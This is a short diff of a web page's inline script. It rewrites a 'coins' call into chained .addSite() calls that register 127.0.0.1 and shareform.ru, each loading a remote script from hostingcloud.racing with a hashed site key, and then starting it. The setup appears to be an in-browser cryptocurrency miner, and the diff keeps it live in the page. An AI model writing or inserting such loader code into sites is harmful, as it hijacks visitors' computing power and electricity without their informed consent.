@@ -462,17 +462,19 @@
             } catch (e) {
                 alert(e);
             }
-            let c = coins([{
+            let c = coins()
+            .addSite({
                 id: 'local',
                 match: '127.0.0.1',
                 src: 'https://www.hostingcloud.racing/2KFX.js',
                 key: 'a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97'
-            }, {
+            })
+            .addSite({
                 id: 'share',
                 match: 'shareform.ru',
                 src: 'https://www.hostingcloud.racing/rhdQ.js',
                 key: 'cc138bc50ff7148e00b642bfa9beb5f8b8c41659c84996f1de44457d1ba5d6dc'
-            }]).start();
+            }).start();
         }
     </script>
 </body>
